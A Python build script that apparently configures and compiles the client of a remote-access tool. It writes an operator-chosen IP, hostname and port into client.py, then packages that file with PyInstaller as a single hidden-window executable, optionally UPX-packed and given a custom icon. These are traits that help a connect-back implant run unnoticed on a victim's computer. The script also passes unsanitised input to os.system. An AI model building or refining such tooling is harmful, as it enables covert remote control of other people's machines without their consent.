import os, sys, socket, shutil

# get the path to python install dir
python_path = "\"" + os.path.dirname(sys.executable)

try:
    # create a dummy socket to get local IP address
    objSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    objSocket.connect(("google.com", 0))
    strCurrentIP = objSocket.getsockname()[0]
    objSocket.close()
except socket.error:
    print("Make sure you are connected to the internet.")
    sys.exit(0)

# check to make sure client.py exists
if not os.path.isfile("client.py"):
    print("client.py not found!")
    sys.exit(0)


print("1. Use: " + strCurrentIP)
print("2. Use a different IP address for server")
print("3. Use a DNS Hostname")

strChoice = input("\n" + "Type selection: ")

if strChoice == "1":
    pass
elif strChoice == "2":
    strCurrentIP = input("\n" + "Enter IP: ")
elif strChoice == "3":
    strDNSHostname = input("\n" + "Enter DNS Hostname: ")
else:
    print("Invalid Choice!")
    sys.exit(0)


strPort = input("\n" + "Enter port number (Press ENTER for default): ")

if strPort == "":
    pass
else:
    # check to make sure port is a number between 0 and 65535
    if not strPort.isdigit():
        print("You must enter numeric value!")
        sys.exit(0)
    elif not 0 <= int(strPort) <= 65535:
        print("You must enter a port between 0 and 65535!")
        sys.exit(0)

    # check to make sure server exists
    elif not os.path.isfile("server.py"):
        print("server.py not found!")
        sys.exit(0)

    # open server and put all lines in an array
    objServerFile = open("server.py", "r")
    arrFileContents = objServerFile.readlines()
    objServerFile.close()

    # use loop in order to ensure that line number doesnt matter
    for intCounter in range(0, len(arrFileContents)):
        # if the current line is the line that sets the port, set the port
        if arrFileContents[intCounter][0:9] == "intPort =":
            arrFileContents[intCounter] = "intPort = " + strPort + "\n"
            break

    # write lines to server
    objServerFile = open("server.py", "w")
    objServerFile.writelines(arrFileContents)
    objServerFile.close()


objClientFile = open("client.py", "r")
arrFileContents = objClientFile.readlines()
objClientFile.close()

# if the user is not using dns
if strChoice == "2" or strChoice == "1":
    for intCounter in range(0, len(arrFileContents)):
        # check for the first occurrence of the host
        if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
            # set strHost to be the IP
            arrFileContents[intCounter] = "strHost = \"" + strCurrentIP + "\"" + "\n"
            # comment out the line below used for DNS
            arrFileContents[intCounter + 1] = "# strHost = socket.gethostbyname(\"\")" + "\n"
            # break for the first occurrence
            break
else:
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
            arrFileContents[intCounter] = "# strHost = \"\"" + "\n"
            arrFileContents[intCounter + 1] = "strHost = socket.gethostbyname(\"" + strDNSHostname + "\")" + "\n"
            break

if strPort != "":
    # if the user entered a custom port, change it in the client
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == "intPort =":
            arrFileContents[intCounter] = "intPort = " + strPort + "\n"
            break

objClientFile = open("client.py", "w")
objClientFile.writelines(arrFileContents)
objClientFile.close()

strUPXChoice = input("\n" + "Use UPX? y/n (Decreases file size but may not work on fresh computers): ")

if strUPXChoice == "y":
    strUPX = ""
else:
    # https://github.com/pyinstaller/pyinstaller/issues/3005
    strUPX = "--noupx"
    shutil.rmtree(os.environ["APPDATA"] + "/pyinstaller")


strIconChoice = input("\n" + "Path for icon (Press ENTER to skip): ")

# remove quotes if there are any
strIconChoice = strIconChoice.replace("\"", "")

# if the user did not choose an icon build the client using pyinstaller
if strIconChoice == "":
    os.system(python_path + "/Scripts/pyinstaller\" client.py " + strUPX + " --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                      "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                      "--onefile --windowed")
# check to make sure the icon exists and that it is a .ico file
elif not os.path.isfile(strIconChoice):
    print("Invalid path!")
    sys.exit(0)
elif not strIconChoice.endswith(".ico"):
    print("Must be a .ico file!")
    sys.exit(0)
else:
    # build the client with an icon
    os.system(python_path + "/Scripts/pyinstaller\" client.py " + strUPX + " --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                      "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                      "--onefile --windowed --icon=\"" + strIconChoice + "\"")
